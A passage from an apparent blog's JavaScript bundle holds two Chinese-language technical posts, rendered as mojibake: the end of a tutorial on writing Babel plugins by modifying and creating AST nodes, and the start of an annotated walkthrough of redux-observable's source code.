class=\\"hljs-comment\\">/*----------ä»¥ä¸Šæ˜¯ç¡®è®¤ç‰ˆæœ¬åˆ¤æ–­åŠŸèƒ½æ˜¯å¦å­˜åœ¨---------*/</span>\\n  <span class=\\"hljs-keyword\\">return</span> {\\n    <span class=\\"hljs-attr\\">visitor</span>: {\\n      <span class=\\"hljs-attr\\">CallExpression</span>: <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\">path, file</span>) </span>{\\n        <span class=\\"hljs-keyword\\">if</span> (path.get(<span class=\\"hljs-string\\">\\"callee\\"</span>).matchesPattern(<span class=\\"hljs-string\\">\\"Object.assign\\"</span>)) {\\n          path.node.callee = file.addHelper(<span class=\\"hljs-string\\">\\"extends\\"</span>);\\n        }\\n      },\\n    },\\n  };\\n});</code></pre></code></pre>\\n<p>ä»ç¬¬6è¡Œå¼€å§‹</p>\\n<ul>\\n<li><p><code>visitor</code>æŒ‡çš„æ˜¯è®¿é—®è€…æ¨¡å¼ï¼Œç®€å•æ¥è¯´å°±æ˜¯æˆ‘ä»¬éå†<code>AST</code>æ ‘ï¼Œæ¯æ¬¡éå†ä¸€ä¸ªèŠ‚ç‚¹ï¼Œéƒ½ä¼šè¿›å…¥visitoræ‰§è¡Œæˆ‘ä»¬çš„ä»£ç ã€‚</p>\\n</li>\\n<li><p><code>CallExpression</code>è¯´æ˜æˆ‘ä»¬è¦æ‰¾çš„ç›¸å…³è¯­ä¹‰æ˜¯<code>è°ƒç”¨è¡¨è¾¾å¼</code>ï¼Œå®ƒæ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œæœ‰2ä¸ªå‚æ•°<code>path</code>å’Œ<code>file</code>ï¼Œ</p>\\n</li>\\n<li><p><code>file</code>è¿™é‡Œè°ƒç”¨äº†addHelperæ–¹æ³•ï¼Œç”¨çš„æ¯”è¾ƒå°‘ï¼Œæš‚æ—¶æç€ã€‚</p>\\n</li>\\n<li><p><code>path</code>ç›¸å½“æ˜¯ä¸€ä¸ªè¿æ¥å¯¹è±¡ï¼Œå®ƒé‡Œé¢çš„å±æ€§å¯ä»¥è¿æ¥åˆ°å„ä¸ªæˆ‘ä»¬éœ€è¦çš„å¯¹è±¡ï¼Œä¾‹å¦‚å¦‚æœæˆ‘ä»¬è¦æ‰¾åˆ°<code>CallExpression</code>å¯¹è±¡æœ¬èº«ï¼Œ\\né‚£ä¹ˆå°±æ˜¯è¿›å…¥<code>path.node</code>ï¼Œå¦‚æœè¦æ‰¾å®ƒçš„çˆ¶èŠ‚ç‚¹ï¼Œè¿›å…¥<code>path.parent</code>ç­‰ç­‰</p>\\n<blockquote>\\n<p>ä¸ªäººç†è§£ï¼šè¦å°½å¿«è¿›å…¥<code>path.node</code>ï¼Œè€Œä¸è¦åœ¨<code>path</code>ä¸Šåšè¿‡å¤šåˆ¤æ–­ç”šè‡³æ˜¯éå†ï¼Œ\\n  å› ä¸ºå®ƒæ˜¯ä¸€ä¸ªåŒ…å«äº†æ‰€æœ‰èŠ‚ç‚¹çš„pathçš„å¯¹è±¡ï¼Œå®ƒçš„ä½œç”¨å°±æ˜¯è®©æˆ‘ä»¬å¿«é€Ÿåˆ°è¾¾æƒ³è¦æ‰¾çš„èŠ‚ç‚¹ï¼Œ\\n  å¦‚æœåœ¨<code>path</code>ä¸Šé¢ä¸€å±‚å±‚å¯»æ‰¾(æˆ‘å°±è¿™ä¹ˆå¹²äº†ï¼)ï¼Œèº«å¿ƒä¿±ç–²...</p>\\n</blockquote>\\n</li>\\n</ul>\\n<p>ç»§ç»­å›åˆ°ä¾‹å­</p>\\n<ul>\\n<li><p><code>path.get(&quot;callee&quot;)</code>ï¼Œå› ä¸ºè¿™æ˜¯ä¸€ä¸ª<code>CallExpression</code>ï¼Œå®ƒä¸€å®šæœ‰ä¸€ä¸ª<code>callee</code>å±æ€§ï¼Œ\\n  é€šè¿‡<code>.get</code>å¯ä»¥å¿«é€ŸæŸ¥æ‰¾ï¼Œç›¸å½“äº<code>path.node.callee</code>ã€‚</p>\\n</li>\\n<li><p><code>.matchesPattern(&quot;Object.assign&quot;)</code>å­—é¢æ„æ€ï¼ŒåŒ¹é…åˆ°<code>Object.assign</code>è¿™ä¸ªå­—æ ·ã€‚</p>\\n</li>\\n<li><p><code>path.node.callee = file.addHelper(&quot;extends&quot;)</code>å°±æ˜¯å°†<code>callee</code>å±æ€§é‡æ–°è®¾ç½®æˆ<code>_extend</code>ï¼Œ\\nè¿™é‡Œçš„<code>file.addHelper(&quot;extends&quot;)</code>è¿”å›çš„ä¹Ÿæ˜¯ä¸€ä¸ª<code>AST</code>å¯¹è±¡ï¼Œ<code>Identifier{type:&quot;Identifier &quot;,name:&quot;_extend&quot;}</code>ï¼Œ\\nè¿™æ˜¯ä¸€ä¸ªæ ‡è¯†ç¬¦ï¼Œåƒå˜é‡ï¼Œå‚æ•°ï¼Œå±æ€§çš„åç§°ç­‰éƒ½æ˜¯æ ‡è¯†ç¬¦ã€‚</p>\\n<p>  è®°ä½ï¼Œè¦åœ¨<code>AST</code>æ ‘ä¸Šæ’å…¥çš„å†…å®¹ä¸€å®šä¹Ÿè¦æ˜¯<code>AST</code>å¯¹è±¡ã€‚</p>\\n</li>\\n</ul>\\n<p>çœ‹åˆ°å—ï¼Œå°±è¿™ä¹ˆå¤šï¼Œå¾ˆå¥½ç†è§£å§ï¼Œå› ä¸ºè¿™é‡Œåªæ˜¯ä¿®æ”¹äº†ä¸€ä¸ªå±æ€§ï¼Œå¹¶æ²¡æœ‰å¢åŠ ã€‚</p>\\n<h2 id=\\"ast-jie-dian-zeng-jia\\">ASTèŠ‚ç‚¹å¢åŠ </h2>\\n<p>åœ¨è¿™ä¸€å—ï¼Œæˆ‘è¢«å›°æ‰°äº†å¥½å‡ ä¸ªå°æ—¶ï¼Œä¸»è¦è¿˜æ˜¯æ¦‚å¿µå¤ªè¿‡ç¼ºå¤±ï¼Œç°åœ¨æ€»ç»“èµ·æ¥ã€‚</p>\\n<ol>\\n<li><p>æ¯ä¸€ä¸ªASTèŠ‚ç‚¹éƒ½æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡å†…éƒ¨æœ‰å¿…é¡»çš„å±æ€§(typeæ˜¯å¿…é¡»çš„)ï¼Œä¹Ÿæœ‰éå¿…é¡»çš„å±æ€§ï¼Œä¾‹å¦‚ï¼š</p>\\n<p> <code>ArrayExpression(æ•°ç»„è¡¨è¾¾å¼)</code>ï¼Œä¹Ÿå°±æ˜¯æ•°ç»„ï¼Œå¿…é¡»çš„å±æ€§åªæœ‰1ä¸ªï¼Œ<code>elements</code>ï¼Œå®ƒçš„å…ƒç´ </p>\\n<p> é‚£ä¹ˆå°±å¯ä»¥æƒ³è±¡ä¸€ä¸‹ï¼Œå®ƒçš„æœ€ç®€å•<code>AST</code>æ ‘ç»“æ„å°±æ˜¯</p>\\n<pre><code><pre class=\\"hljs\\"><code> {\\n   type:&quot;ArrayExpression&quot;,\\n   elements:[]\\n }</code></pre></code></pre><p> ä½†æŸ¥æ‰¾æ—¶ä¼šå‘ç°ï¼Œé»˜è®¤çš„æ ‘è¿˜æœ‰å…¶ä»–è®¸å¤šå±æ€§ï¼Œä¾‹å¦‚<code>start</code>,<code>loc</code>ç­‰ç­‰ï¼Œè¿™äº›æˆ‘ä»¬åœ¨åˆ›å»ºçš„æ—¶å€™ï¼Œå¯ä»¥ä¸å¿…ç†ä¼šã€‚</p>\\n</li>\\n<li><p>åˆ›å»ºæ–¹å¼æœ‰å¤šç§ï¼Œåˆ†ä¸º2ç±»ï¼Œä½¿ç”¨å·¥å…·åˆ›å»ºå’Œä¸ä½¿ç”¨å·¥å…·åˆ›å»ºã€‚</p>\\n<p> å½“ç„¶ï¼Œæœ€å¼€å§‹æˆ‘æ˜¯ä¸ä½¿ç”¨å·¥å…·çš„ï¼Œå½“æ—¶å†™ä¸€ä¸ªå¯¹è±¡ç»“æ„é‡Œé¢çš„<code>key</code>å±æ€§æ˜¯å­—ç¬¦ä¸²ï¼Œ<code>value</code>å±æ€§æ˜¯æ•°ç»„(å¹¶ä¸”æœ‰çš„æœ‰å¯èƒ½å¤šå±‚åµŒå¥—)ï¼Œ\\n ç„¶åå¼€å§‹ä¸€ä¸ªä¸ªèŠ‚ç‚¹å¯¹è±¡åˆ›å»ºï¼Œé€’å½’ï¼Œéå†ï¼Œå†™å•Šå†™ï¼Œå†™å®Œæ‰§è¡Œï¼Œå¤±è´¥ï¼Œå¥½å§ï¼Œä¸€å±‚ä¸€å±‚çš„å‰¥å¼€è°ƒè¯•...è¿™å°±æ˜¯å†™bugçš„æ­£ç¡®æ–¹å¼ã€‚</p>\\n<p> å¥½å§ï¼Œ<code>ctrl+a -&gt; del</code>ï¼Œè¿™é‡Œåªè®²æˆ‘ä½¿ç”¨çš„æ–¹å¼ã€‚</p>\\n<p> å®‰è£…<code>@babel/core</code>ï¼Œå¼•å…¥<code>import {template,types as t} from &quot;@babel/core&quot;</code></p>\\n<ul>\\n<li><p><code>template</code></p>\\n<p>ç”¨æ¥åˆ›å»ºæ¨¡æ¿çš„ï¼Œèƒ½å°‘å†™å¾ˆå¤šä¸œè¥¿ï¼Œä¾‹å¦‚ï¼š<code>template(&quot;let x=SOMEVALUE&quot;)</code>\\nè¿™é‡Œåªéœ€è¦åœ¨åé¢ä¼ å…¥<code>SOMEVALUE(è¦å¤§å†™)</code>çš„å€¼ï¼Œå°±ä¼šè‡ªåŠ¨åˆ›å»ºå‡º<code>let x=xxxx</code>è¿™ä¸ªè¡¨è¾¾å¼çš„<code>AST</code>å¯¹è±¡ã€‚</p>\\n</li>\\n<li><p><code>types</code></p>\\n<p>ç”¨æ¥åˆ›å»ºå•ä¸ªèŠ‚ç‚¹å¯¹è±¡çš„ã€‚\\næˆ–è®¸æˆ‘åªæƒ³ç®€å•åˆ›å»ºä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆå°±æ˜¯<code>t.stringLiteral(&quot;è¿™é‡Œæ˜¯è¦åˆ›å»ºçš„å­—ç¬¦ä¸²&quot;)</code>ï¼Œ</p>\\n<p>åˆ›å»ºä¸€ä¸ªæ•°ç»„ï¼Œé‚£ä¹ˆæ˜¯<code>t.arrayExpression(elements)</code>ï¼Œ</p>\\n<p>ä¹Ÿå°±æ˜¯ä½¿ç”¨<code>t</code>çš„èŠ‚ç‚¹åç§°æ–¹æ³•ï¼Œä¼ å…¥è¿™ä¸ªèŠ‚ç‚¹å¿…é¡»çš„å±æ€§å°±å¯ä»¥äº†ï¼Œä½ åªéœ€è¦äº†è§£ä½ çš„ä»£ç å¯¹åº”çš„è¯­ä¹‰ï¼Œ\\næœ€åæ‹¼æ¥ï¼Œä¾‹å¦‚ ä¸€ä¸ªæœ‰3ä¸ªå­—ç¬¦ä¸²ä½œä¸ºå…ƒç´ çš„æ•°ç»„ï¼š</p>\\n<p><code>t.arrayExpression([t.stringLiteral(&quot;a&quot;),t.stringLiteral(&quot;b&quot;),t.stringLiteral(&quot;c&quot;)])</code></p>\\n<p>ç®€æ´é«˜æ•ˆã€‚</p>\\n</li>\\n</ul>\\n</li>\\n</ol>\\n<h2 id=\\"zong-jie\\">æ€»ç»“</h2>\\n<p>å…³äºASTçš„æ“ä½œè¿˜æœ‰å¾ˆå¤šï¼Œä¾‹å¦‚åˆ é™¤ï¼Œæ›¿æ¢...å…·ä½“å¯ä»¥çœ‹<code>bable-handbook</code>ï¼Œè¿™ç¯‡æ–‡ç« è¯´çš„ä¿®æ”¹å’Œå¢åŠ ï¼Œå†…å®¹ä¸æ·±ï¼Œä¸»è¦æ˜¯è®©æˆ‘ä»¬å¯¹AST\\nçš„ç»“æ„ï¼Œå¹¶ä¸”æ˜¯å¦‚ä½•é€šè¿‡å®ƒå»åˆ›å»ºbabelæ’ä»¶èƒ½æœ‰ä¸€ä¸ªæ¦‚å¿µï¼Œæ¥ä¸‹æ¥çš„æ›´å¤šå‘æ˜å°±é è‡ªå·±çš„æ¢ç´¢äº†ã€‚</p>\\n","toc":[{"anchor":"hui-gu","level":2,"text":"å›é¡¾"},{"anchor":"wen-ti","level":2,"text":"é—®é¢˜"},{"anchor":"jie-jue-fang-an","level":2,"text":"è§£å†³æ–¹æ¡ˆ"},{"anchor":"ast-jie-dian-xiu-gai","level":2,"text":"ASTèŠ‚ç‚¹ä¿®æ”¹"},{"anchor":"ast-jie-dian-zeng-jia","level":2,"text":"ASTèŠ‚ç‚¹å¢åŠ "},{"anchor":"zong-jie","level":2,"text":"æ€»ç»“"}],"relatedTags":null,"created_at":"2018-09-20","timeArr":[2018,8,20,0,0,0,0],"title":"ä»é›¶å¼€å§‹æ„å»ºbabelæ’ä»¶","uuid":"1fe9476aee8ec9e615a5ea77d64b322605aa28f8","summary":"<h4>å›é¡¾</h4>\\n<p>åœ¨è¿™ä¸€ç‰‡æ–‡ç« ä¸­ï¼Œæˆ‘æ„å»ºä¸€ä¸ªè·å–å‡½æ•°å‚æ•°åçš„å·¥å…·ï¼Œæ˜¯é€šè¿‡<code>esprima</code>å»è§£æ<code>AST</code>å¹¶å¯¹å…¶è¿›è¡Œåˆ†æåˆ¤æ–­ã€‚</p>\\n<p>é€šè¿‡å¯¹<code>AST</code>çš„åˆ†æï¼Œå‡ ä¹èƒ½å…¼å®¹æ‰€æœ‰å‡½æ•°å’Œå‚æ•°çš„å†™æ³•ï¼Œè¿™æ˜¯å› ä¸ºå®ƒæ˜¯ä»è¯­ä¹‰ä¸Šåˆ†æä»£ç ã€‚</p>\\n<h4>é—®é¢˜</h4>\\n<p>ä½†ä½¿ç”¨çš„åŒæ—¶ï¼Œä¹Ÿå‘ç°äº†3ä¸ªé—®é¢˜ï¼Œ<strong>ç¬¬1ä¸ªæ˜¯è‡´å‘½çš„</strong>ã€‚</p>\\n<ol>\\n<li>babelç¼–è¯‘ã€‚</li>\\n</ol>\\n<p>...</p>","slug":"cong-ling-kai-shi-gou-jian-babel-cha-jian","sha":"c6aabf028612373f374ca39935fa4a385595f224"}')},582:function(n){n.exports=JSON.parse('{"content":"<h2 id=\\"yue-du-qian-ti\\">é˜…è¯»å‰æ</h2>\\n<ol>\\n<li>æœ‰rxjsåŸºç¡€ï¼Œå¯¹<code>Observable</code>, <code>Subject</code>,<code>pipe</code>å’Œä¸€äº›æ“ä½œç¬¦(ä¾‹å¦‚<code>filter</code>,<code>map</code>,<code>merge</code>,<code>mergeMap</code>)æ‰§è¡Œæµç¨‹æœ‰åŸºæœ¬äº†è§£ï¼Œæœ€èµ·ç é‡åˆ°ä¸æ¸…æ¥šæœ‰å»æŸ¥é˜…çš„åŠ¨åŠ›</li>\\n<li>æ¯”è¾ƒç†Ÿæ‚‰<code>redux</code>ä¸­é—´ä»¶çš„å†™æ³•ï¼Œå¦åˆ™åƒ<code>createEpicMiddleware.js</code>ä¸­çš„è¿™ä¸€æ®µä¼šæä¸æ¸…æ¥š<pre><code><pre class=\\"hljs\\"><code> return next =&gt; {\\n   return action =&gt; {</code></pre></code></pre> å…³äºreduxä¹Ÿå¯ä»¥æŸ¥é˜…æˆ‘ä¹‹å‰å†™çš„<a href=\\"https://github.com/stonehank/sourcecode-analysis/tree/master/source-code.redux\\">reduxæºç æ³¨é‡Š</a></li>\\n</ol>\\n<h2 id=\\"mu-lu-jie-gou\\">ç›®å½•ç»“æ„</h2>\\n<pre><code><pre class=\\"hljs\\"><code>src/\\nâ”œâ”€â”€utils/\\n    â”œâ”€â”€console.js\\nâ”œâ”€â”€ ActionsObservable.js    // è‡ªå®šä¹‰çš„ç±»ï¼Œç»§æ‰¿Observable, ç»‘å®šäº†æ“ä½œç¬¦çš„é“¾å¼è°ƒç”¨\\nâ”œâ”€â”€ combineEpics.js         // \\nâ”œâ”€â”€ createEpicMiddleware.js // è°ƒç”¨å¯ç”Ÿæˆreduxçš„ä¸­é—´ä»¶, é€šè¿‡runç»‘å®šéœ€è¦æ‰§è¡Œçš„æµ\\nâ”œâ”€â”€ index.js                // å¯¹å¤–æ¥å£\\nâ”œâ”€â”€ operators.js            // è‡ªå®šä¹‰çš„æµæ“ä½œæ–¹æ³•, ç›®å‰åªæœ‰ofType\\nâ”œâ”€â”€ StateObservable.js      // è‡ªå®šä¹‰çš„ç±»ï¼Œç»§æ‰¿Observable, ç”¨äºä¿å­˜å½“å‰state</code></pre></code></pre><h2 id=\\"yuan-ma-fen-xi\\">æºç åˆ†æ</h2>\\n<p>index.jsï¼šå…¬å¼€æ¥å£ï¼Œç•¥</p>\\n<hr>\\n<h3 id=\\"actionobservablejs\\">ActionObservable.js</h3>\\n<p>ç»§æ‰¿äº†<code>Observable</code>ç±»</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">export</span> <span class=\\"hljs-class\\"><span class=\\"hljs-keyword\\">class</span> <span class=\\"hljs-title\\">ActionsObservable</span> <span class=\\"hljs-keyword\\">extends</span> <span class=\\"hljs-title\\">Observable</span></span></code></pre></code></pre>\\n<p>å®šä¹‰äº†ä¸¤ä¸ªé™æ€å‡½æ•°ï¼Œç”¨è°ƒç”¨çš„å¯¹è±¡åŒ…è£…äº†åŸæ¥çš„<code>of</code>å’Œ<code>from</code></p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code>  <span class=\\"hljs-keyword\\">static</span> <span class=\\"hljs-keyword\\">of</span>(...actions) {\\n    <span class=\\"hljs-keyword\\">return</span> <span class=\\"hljs-keyword\\">new</span> <span class=\\"hljs-keyword\\">this</span>(<span class=\\"hljs-keyword\\">of</span>(...actions));\\n  }\\n  <span class=\\"hljs-keyword\\">static</span> <span class=\\"hljs-keyword\\">from</span>(actions, scheduler) {\\n    <span class=\\"hljs-keyword\\">return</span> <span class=\\"hljs-keyword\\">new</span> <span class=\\"hljs-keyword\\">this</span>(<span class=\\"hljs-keyword\\">from</span>(actions, scheduler));\\n  }</code></pre></code></pre>\\n<p>æ„é€ å‡½æ•°ï¼Œå®šä¹‰äº†<code>source</code>å±æ€§ä¸ºå‚æ•°ï¼Œè¿™ä¸ªå±æ€§ç”¨æ¥ç»‘å®šæ“ä½œç¬¦çš„é“¾å¼è°ƒç”¨</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code>  <span class=\\"hljs-keyword\\">constructor</span>(actionsSubject) {\\n    <span class=\\"hljs-keyword\\">super</span>();\\n    <span class=\\"hljs-keyword\\">this</span>.source = actionsSubject;\\n  }</code></pre></code></pre>\\n<p>è¿™é‡Œé‡å†™äº†çˆ¶ç±»(Observable)çš„<code>lift</code>ï¼Œå…ˆçœ‹ä¸€ä¸‹çˆ¶ç±»çš„<code>lift</code>æ˜¯æ€æ ·çš„</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">var</span> observable = <span class=\\"hljs-keyword\\">new</span> Observable();\\nobservable.source = <span class=\\"hljs-keyword\\">this</span>;\\nobservable.operator = operator;\\n<span class=\\"hljs-keyword\\">return</span> observable;</code></pre></code></pre>\\n<p>å¯ä»¥çœ‹åˆ°æ”¹åŠ¨å°±åœ¨äºåŸæ¥çš„ç”¨<code>new Observable</code>ï¼Œè¿™é‡Œä½¿ç”¨<code>new ActionObservable()</code>ï¼Œå…¶ä»–éƒ½æ˜¯ä¸€æ¨¡ä¸€æ ·ï¼Œ\\nå°è£…æˆ<code>ActionObservable</code>ç±»çš„æ„ä¹‰ï¼Œç»Ÿä¸€ç±»å‹ï¼Œæ–¹ä¾¿åé¢çš„é“¾å¼ç»‘å®š</p>\\n<p><code>lift</code>åœ¨<code>pipe</code>çš„æ—¶å€™ä¼šç”¨åˆ°ï¼Œå…¶å®è¿™éƒ½æ˜¯rxjsæºç è°ƒç”¨çš„æ–¹å¼()</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code>lift(operator) {\\n <span class=\\"hljs-keyword\\">const</span> observable = <span class=\\"hljs-keyword\\">new</span> ActionsObservable(<span class=\\"hljs-keyword\\">this</span>);\\n observable.operator = operator;\\n <span class=\\"hljs-keyword\\">return</span> observable;\\n}</code></pre></code></pre>\\n<p>å®šä¹‰äº†ä¸€ä¸ªæ“ä½œæ–¹æ³•<code>ofType</code>ï¼Œå…·ä½“è§operators</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code>  ofType(...keys) {\\n    <span class=\\"hljs-keyword\\">return</span> ofType(...keys)(<span class=\\"hljs-keyword\\">this</span>);\\n  }</code></pre></code></pre>\\n<hr>\\n<h3 id=\\"combineepicsjs\\">combineEpics.js</h3>\\n<p>å°†å¤šä¸ªepicåˆå¹¶æˆ1ä¸ªepicï¼Œå°±æ˜¯åˆ†åˆ«æ‰§è¡Œæ¯ä¸€ä¸ªepic(ç»‘å®šç”¨æˆ·å®šä¹‰çš„æ“ä½œç¬¦)ï¼Œç„¶åå°†æ¯ä¸€ä¸ªç»“æœçš„æµç”¨mergeåˆå¹¶</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-comment\\">// å¼•å…¥merge</span>\\n<span class=\\"hljs-keyword\\">import</span> { merge } <span class=\\"hljs-keyword\\">from</span> <span class=\\"hljs-string\\">\'rxjs\'</span>;\\n\\n<span class=\\"hljs-comment\\">/**\\n  Merges all epics into a single one.\\n */</span>\\n<span class=\\"hljs-keyword\\">export</span> <span class=\\"hljs-keyword\\">const</span> combineEpics = <span class=\\"hljs-function\\">(<span class=\\"hljs-params\\">...epics</span>) =&gt;</span> {\\n  <span class=\\"hljs-comment\\">// é€šè¿‡mergeæ“ä½œç¬¦åˆå¹¶å¤šä¸ªepicæ‰§è¡Œåçš„output$æµ</span>\\n  <span class=\\"hljs-comment\\">// ...epicsæ˜¯å¤šä¸ªepic</span>\\n  <span class=\\"hljs-keyword\\">const</span> merger = <span class=\\"hljs-function\\">(<span class=\\"hljs-params\\">...args</span>) =&gt;</span> merge(\\n    ...epics.map(<span class=\\"hljs-function\\"><span class=\\"hljs-params\\">epic</span> =&gt;</span> {\\n      <span class=\\"hljs-comment\\">// æ‰§è¡Œæ¯ä¸€ä¸ªepicï¼Œç¡®ä¿æœ‰è¿”å›å€¼ï¼Œæ­¤å¤„æ‰§è¡Œå°±æ˜¯ç»‘å®šäº†ç”¨æˆ·è‡ªå®šä¹‰æ“ä½œç¬¦çš„æ­¥éª¤</span>\\n      <span class=\\"hljs-keyword\\">const</span> output$ = epic(...args);\\n      <span class=\\"hljs-keyword\\">if</span> (!output$) {\\n        <span class=\\"hljs-keyword\\">throw</span> <span class=\\"hljs-keyword\\">new</span> <span class=\\"hljs-built_in\\">TypeError</span>(<span class=\\"hljs-string\\">`combineEpics: one of the provided Epics \\"<span class=\\"hljs-subst\\">${epic.name || <span class=\\"hljs-string\\">\'&lt;anonymous&gt;\'</span>}</span>\\" does not return a stream. Double check you\\\\\'re not missing a return statement!`</span>);\\n      }\\n      <span class=\\"hljs-comment\\">// è¿”å›ç»“æœï¼Œæœ€åè¿›è¡Œmergeåˆå¹¶</span>\\n      <span class=\\"hljs-keyword\\">return</span> output$;\\n    })\\n  );\\n\\n  <span class=\\"hljs-comment\\">// Technically the `name` property on Function\'s are supposed to be read-only.</span>\\n  <span class=\\"hljs-comment\\">// While some JS runtimes allow it anyway (so this is useful in debugging)</span>\\n  <span class=\\"hljs-comment\\">// some actually throw an exception when you attempt to do so.</span>\\n  <span class=\\"hljs-keyword\\">try</span> {\\n    <span class=\\"hljs-built_in\\">Object</span>.defineProperty(merger, <span class=\\"hljs-string\\">\'name\'</span>, {\\n      <span class=\\"hljs-attr\\">value</span>: <span class=\\"hljs-string\\">`combineEpics(<span class=\\"hljs-subst\\">${epics.map(epic =&gt; epic.name || <span class=\\"hljs-string\\">\'&lt;anonymous&gt;\'</span>).join(<span class=\\"hljs-string\\">\', \'</span>)}</span>)`</span>,\\n    });\\n  } <span class=\\"hljs-keyword\\">catch</span> (e) {}\\n\\n  <span class=\\"hljs-keyword\\">return</span> merger;\\n};</code></pre></code></pre>\\n<hr>\\n<h3 id=\\"createepicmiddlewarejs\\">createEpicMiddleware.js</h3>\\n<p>ä¸€ã€æç¤ºç›®å‰å‚æ•°ä¸åœ¨æ¥å—<code>rootEpic</code>ï¼Œè€Œæ˜¯ä½¿ç”¨<code>epicMiddleware.run(rootEpic)</code>ï¼Œè¿™é‡Œ<code>epicMiddleware</code>å°±æ˜¯æ‰§è¡Œ<code>createEpicMiddleware</code>çš„è¿”å›å€¼</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">export</span> <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">createEpicMiddleware</span>(<span class=\\"hljs-params\\">options = {}</span>) </span>{\\n  <span class=\\"hljs-keyword\\">if</span> (process.env.NODE_ENV !== <span class=\\"hljs-string\\">\'production\'</span> &amp;&amp; <span class=\\"hljs-keyword\\">typeof</span> options === <span class=\\"hljs-string\\">\'function\'</span>) {\\n    <span class=\\"hljs-keyword\\">throw</span> <span class=\\"hljs-keyword\\">new</span> <span class=\\"hljs-built_in\\">TypeError</span>(<span class=\\"hljs-string\\">\'Providing your root Epic to `createEpicMiddleware(rootEpic)` is no longer supported, instead use `epicMiddleware.run(rootEpic)`\\\\n\\\\nLearn more: https://redux-observable.js.org/MIGRATION.html#setting-up-the-middleware\'</span>);\\n  }\\n  <span class=\\"hljs-comment\\">/*...*/</span>\\n}</code></pre></code></pre>\\n<p>äºŒã€è¿™ä¸€å®šä¹‰äº†å‡ ä¸ªé‡è¦å˜é‡(æµ)ï¼Œè¿™é‡Œä¸€ä¸ªé‡è¦é—®é¢˜</p>\\n<pre><code><pre class=\\"hljs\\"><code>1. rxjså†…éƒ¨çš„sourceæ˜¯ä»€ä¹ˆ(åœ¨ActionObservableå†…éƒ¨å‡ºç°)\\n2. rxjså†…éƒ¨çš„operatoræ˜¯ä»€ä¹ˆ(åœ¨ActionObservableå†…éƒ¨å‡ºç°)\\nAï¼šsourceå®šä¹‰äº†æ“ä½œç¬¦æ‰§è¡Œçš„æµå‘ï¼Œoperatorå®šä¹‰äº†æ“ä½œç¬¦æ˜¯ä»€ä¹ˆæ“ä½œç¬¦ï¼Œè¿™ä¸¤è€…ç»“åˆä½¿ç”¨æ¥è¿›è¡Œé“¾å¼ç»‘å®š</code></pre></code></pre><p>æ¥ç€çœ‹æ³¨é‡Š</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">export</span> <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">createEpicMiddleware</span>(<span class=\\"hljs-params\\">options = {}</span>) </span>{\\n  <span class=\\"hljs-comment\\">/*...*/</span>\\n  <span class=\\"hljs-comment\\">// å®šä¹‰ä¸€ä¸ªSubjectï¼Œç»‘å®šå†…éƒ¨æ“ä½œæµï¼Œé€šè¿‡è°ƒç”¨epic$.next()ï¼Œä¹Ÿå°±æ˜¯`epicMiddleware.run`æ¥åˆå§‹åŒ–action$çš„ç»‘å®š</span>\\n  <span class=\\"hljs-keyword\\">const</span> epic$ = <span class=\\"hljs-keyword\\">new</span> Subject();\\n  <span class=\\"hljs-keyword\\">let</span> store;\\n  <span class=\\"hljs-comment\\">// ä½œä¸ºreduxçš„ä¸­é—´ä»¶ï¼Œå…¶ä¸­epicMiddlewareæ˜¯è¿”å›å€¼ä½œä¸ºå¤–éƒ¨API</span>\\n  <span class=\\"hljs-keyword\\">const</span> epicMiddleware = <span class=\\"hljs-function\\"><span class=\\"hljs-params\\">_store</span> =&gt;</span> {\\n    <span class=\\"hljs-comment\\">// å½“åœ¨å¼€å‘ç¯å¢ƒå¹¶ä¸”å¤šæ¬¡ä½¿ç”¨ä¸åŒçš„ createEpicMiddlewareè¿”å›å€¼ï¼Œä¼šæå‡ºè­¦å‘Š(é¿å…é‡å¤æ‰§è¡Œå¤šæ¬¡)</span>\\n    <span class=\\"hljs-keyword\\">if</span> (process.env.NODE_ENV !== <span class=\\"hljs-string\\">\'production\'</span> &amp;&amp; store) {\\n      <span class=\\"hljs-comment\\">// https://github.com/redux-observable/redux-observable/issues/389</span>\\n      <span class=\\"hljs-built_in\\">require</span>(<span class=\\"hljs-string\\">\'./utils/console\'</span>).warn(<span class=\\"hljs-string\\">\'this middleware is already associated with a store. createEpicMiddleware should be called for every store.\\\\n\\\\nLearn more: https://goo.gl/2GQ7Da\'</span>);\\n    }\\n    store = _store;\\n    <span class=\\"hljs-comment\\">// å®šä¹‰ä¸€ä¸ªSubjectï¼Œç»‘å®šäº†é˜Ÿåˆ—è°ƒåº¦å™¨ (åé¢è¿™ä¸ªç”¨æ¥ç»‘å®šæ‰€æœ‰æ“ä½œæµ)</span>\\n    <span class=\\"hljs-keyword\\">const</span> actionSubject$ = <span class=\\"hljs-keyword\\">new</span> Subject().pipe(\\n      <span class=\\"hljs-comment\\">// todo è°ƒåº¦å™¨ï¼Œçœ‹äº†ä¸€äº›èµ„æ–™ï¼Œè¿˜æœ‰æœ‰ç‚¹æ¨¡ç³Š</span>\\n      observeOn(queueScheduler)\\n    );\\n    <span class=\\"hljs-comment\\">//  å®šä¹‰ä¸€ä¸ªSubjectï¼Œç»‘å®šäº†é˜Ÿåˆ—è°ƒåº¦å™¨ (åé¢è¿™ä¸ªç”¨æ¥å¯¹æ¯”å½“å‰storeï¼Œé˜²æ­¢é‡å¤æ¸²æŸ“)</span>\\n    <span class=\\"hljs-keyword\\">const</span> stateSubject$ = <span class=\\"hljs-keyword\\">new</span> Subject().pipe(\\n      